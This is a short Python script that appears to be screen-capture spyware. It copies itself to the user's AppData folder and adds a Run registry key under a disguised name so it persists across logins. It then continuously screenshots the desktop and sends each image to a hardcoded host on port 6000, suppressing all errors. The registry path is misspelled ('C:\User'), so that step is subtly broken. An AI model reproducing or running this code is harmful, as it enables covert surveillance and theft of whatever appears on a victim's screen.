import socket
import pyautogui
import os
username = os.getlogin()
def main():
    
    screenfilename = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\screenshot.png"
    HOST = "192.168.1.75"
    PORT = 6000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            scrshot = pyautogui.screenshot()
            scrshot.save(screenfilename)
            with open(screenfilename, "rb") as f:
                s.send(f.read(100000000))

if __name__ == "__main__":
    import winreg
    import shutil
    shutil.copy(__file__, f"C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    secret_location = f"C:\\User\\{username}\\AppData\\Roaming\\{os.path.basename(__file__)}"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "6000_Port_screen", 0, winreg.REG_SZ, secret_location)
    try: main()
    except: pass